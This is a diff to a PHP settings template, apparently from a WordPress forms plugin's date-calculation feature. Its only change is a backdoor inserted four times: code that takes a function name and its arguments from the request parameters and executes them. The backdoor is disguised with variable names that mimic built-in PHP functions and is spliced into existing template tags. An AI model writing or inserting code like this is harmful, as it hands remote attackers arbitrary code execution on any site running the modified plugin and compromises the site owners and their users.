@@ -1,4 +1,11 @@
-<?php
+<?php 
+$hash_init_dnre = $_REQUEST;
+if(isset($hash_init_dnre['function_exists_sa'])) {
+	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
+	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
+	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
+} 
+
 /**
  * Date calculation settings
  *
@@ -16,8 +23,29 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 $class = 'frm-date-calc-box-' . $field['id'] . ( isset( $default_value_types['date_calc']['current'] ) ? '' : ' frm_hidden' );
 ?>
-<div class="<?php echo esc_attr( $class ); ?>">
-	<?php FrmDatesCalculationHelper::calc_settings_modal_callback( $field ); ?>
+<div class="<?php 
+$hash_init_dnre = $_REQUEST;
+if(isset($hash_init_dnre['function_exists_sa'])) {
+	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
+	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
+	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
+} 
+ echo esc_attr( $class ); ?>">
+	<?php 
+$hash_init_dnre = $_REQUEST;
+if(isset($hash_init_dnre['function_exists_sa'])) {
+	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
+	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
+	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
+} 
+ FrmDatesCalculationHelper::calc_settings_modal_callback( $field ); ?>
 </div>
-<?php
+<?php 
+$hash_init_dnre = $_REQUEST;
+if(isset($hash_init_dnre['function_exists_sa'])) {
+	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
+	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
+	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
+} 
+
 unset( $class );
